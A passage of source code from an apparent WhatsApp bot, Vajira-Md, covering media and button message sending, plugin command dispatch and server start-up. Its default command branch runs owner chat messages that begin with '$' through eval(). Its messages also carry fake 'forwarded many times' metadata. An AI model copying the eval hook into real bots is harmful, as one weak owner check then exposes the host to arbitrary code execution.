                        mimetype: 'video/mp4',
                        ...options
                    }, {
                        quoted: quoted,
                        ...options
                    })
                }
                if (mime.split("/")[0] === "audio") {
                    return conn.sendMessage(jid, {
                        audio: await getBuffer(url),
                        caption: caption,
                        mimetype: 'audio/mpeg',
                        ...options
                    }, {
                        quoted: quoted,
                        ...options
                    })
                }
            }
conn.sendButtonMessage = async (jid, buttons, quoted, opts = {}) => {

                let header;
                if (opts?.video) {
                    var video = await prepareWAMessageMedia({
                        video: {
                            url: opts && opts.video ? opts.video : ''
                        }
                    }, {
                        upload: conn.waUploadToServer
                    })
                    header = {
                        title: opts && opts.header ? opts.header : '',
                        hasMediaAttachment: true,
                        videoMessage: video.videoMessage,
                    }

                } else if (opts?.image) {
                    var image = await prepareWAMessageMedia({
                        image: {
                            url: opts && opts.image ? opts.image : ''
                        }
                    }, {
                        upload: conn.waUploadToServer
                    })
                    header = {
                        title: opts && opts.header ? opts.header : '',
                        hasMediaAttachment: true,
                        imageMessage: image.imageMessage,
                    }

                } else {
                    header = {
                        title: opts && opts.header ? opts.header : '',
                        hasMediaAttachment: false,
                    }
                }


                let message = generateWAMessageFromContent(jid, {
                    viewOnceMessage: {
                        message: {
                            messageContextInfo: {
                                deviceListMetadata: {},
                                deviceListMetadataVersion: 2,
                            },
                            interactiveMessage: {
                                body: {
                                    text: opts && opts.body ? opts.body : ''
                                },
                                footer: {
                                    text: opts && opts.footer ? opts.footer : ''
                                },
                                header: header,
                                nativeFlowMessage: {
                                    buttons: buttons,
                                    messageParamsJson: ''
                                },
                           contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: config.C_JID,
                  newsletterName: config.C_NAME,
                  serverMessageId: 143
                },
                externalAdReply: { 
title: config.T_LINE,
body: config.B_LINE,
mediaType: 1,
sourceUrl: config.VAJIRA_WA ,
thumbnailUrl: config.LOGO2 ,
renderLargerThumbnail: false

                }
                           }
                            }
                        }
                    }
                },{
                    quoted: quoted
                })
                await conn.sendPresenceUpdate('composing', jid)
                await sleep(1000 * 1);
                return await conn.relayMessage(jid, message["message"], {
                    messageId: message.key.id
                })
            }


/*	      
if (!isMe && !isOwner && !isGroup && config.ONLY_GROUP == 'true') return 
if (!isMe && !isOwner && config.ONLY_ME == 'true') return 
        */
            //==================================plugin map================================
         const events = require('./lib/command')
const cmdName = isCmd ?  command : false;
if (isCmd) {
  const cmd = events.commands.find((cmd) => cmd.pattern === (cmdName)) || events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName))
  if (cmd) {
    if (cmd.react) conn.sendMessage(from, { react: { text: cmd.react, key: mek.key } })

    try {
cmd.function(conn, mek, m, { from, prefix, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply ,config, isCreator , isDev, botNumber2 });
    } catch (e) {
console.error("[PLUGIN ERROR] ", e);
    }
  }
}
events.commands.map(async (command) => {
  if (body && command.on === "body") {
    command.function(conn, mek, m, { from, prefix, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply , config, isCreator , isDev, botNumber2 });
  } else if (mek.q && command.on === "text") {
    command.function(conn, mek, m, { from, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply , config ,isCreator , isDev, botNumber2 });
  } else if (
    (command.on === "image" || command.on === "photo") &&
    mek.type === "imageMessage"
  ) {
    command.function(conn, mek, m, { from, prefix, l, quoted, body,  isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply , config, isCreator , isDev, botNumber2 });
  } else if (
    command.on === "sticker" &&
    mek.type === "stickerMessage"
  ) {
    command.function(conn, mek, m, { from, prefix, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply , config, isCreator , isDev, botNumber2 });
  }
});





      
//==================================================================	

	      
            switch (command) {
        case 'jid':
        reply(from)
        break
        
        default:				
        if (isOwner && body.startsWith('$')) {
        let bodyy = body.split('$')[1]
        let code2 = bodyy.replace("°", ".toString()");
        try {
        let resultTest = await eval(code2);
        if (typeof resultTest === "object") {
        reply(util.format(resultTest));
        } else {
        reply(util.format(resultTest));
        }
        } catch (err) {
        reply(util.format(err));
        }}}
        } catch (e) {
            const isError = String(e)
            console.log(isError)
        }
    })
}

app.get("/", (req, res) => {
res.send("📟 Vajira-Md Working successfully!");
});
app.listen(port, () => console.log(`Vajira-Md Server listening on port http://localhost:${port}`));
setTimeout(() => {
connectToWA()
}, 3000);
    
